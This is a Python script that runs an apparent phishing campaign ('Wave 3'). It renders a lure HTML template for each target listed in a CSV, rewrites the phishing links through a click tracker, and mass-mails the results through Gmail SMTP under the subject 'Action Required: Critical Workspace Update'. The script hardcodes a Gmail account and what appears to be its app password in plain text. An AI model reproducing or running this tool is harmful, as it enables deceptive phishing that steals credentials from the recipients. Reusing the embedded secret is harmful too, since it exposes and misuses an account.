import csv
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from jinja2 import Template

# SMTP configuration
SMTP_HOST = 'smtp.gmail.com'
SMTP_PORT = 587
SMTP_USER = 'jasonnorman66994@gmail.com'
SMTP_PASS = 'uwbsscdmgggtzamy'
FROM_ADDR = 'jasonnorman66994@gmail.com'

# Click tracker base URL
CLICK_TRACKER_BASE = 'http://localhost:8080/track?cid='

# Paths
TEMPLATE_PATH = 'wave3_lure_template.html'
TARGETS_CSV = 'Wave_3_Targets.csv'  # Columns: email,deviceId,phishUrl
OUTPUT_DIR = 'lure_variants'

# Ensure output directory exists
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Load HTML template
with open(TEMPLATE_PATH, encoding='utf-8') as f:
    template_str = f.read()

# Jinja2 template (replace $deviceId and $phishUrl)
template = Template(template_str.replace('$($deviceId)', '{{ deviceId }}').replace('$phishUrl', '{{ phishUrl }}'))

# Read targets and send emails
with open(TARGETS_CSV, newline='', encoding='utf-8') as csvfile:
    reader = csv.DictReader(csvfile)
    for row in reader:
        deviceId = row['deviceId']
        phishUrl = row['phishUrl']
        email = row.get('email', deviceId)
        # Inject click tracking
        tracked_url = f"{CLICK_TRACKER_BASE}{deviceId}&redirect={phishUrl}"
        html = template.render(deviceId=deviceId, phishUrl=tracked_url)
        out_path = os.path.join(OUTPUT_DIR, f'lure_{deviceId}.html')
        with open(out_path, 'w', encoding='utf-8') as outf:
            outf.write(html)
        print(f'Generated: {out_path}')
        # Send email
        msg = MIMEMultipart('alternative')
        msg['Subject'] = 'Action Required: Critical Workspace Update'
        msg['From'] = FROM_ADDR
        msg['To'] = email
        part = MIMEText(html, 'html')
        msg.attach(part)
        try:
            with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
                server.starttls()
                server.login(SMTP_USER, SMTP_PASS)
                server.sendmail(FROM_ADDR, email, msg.as_string())
            print(f"Email sent to {email}")
        except Exception as e:
            print(f"Failed to send email to {email}: {e}")

print('All lure variants generated and emails sent.')
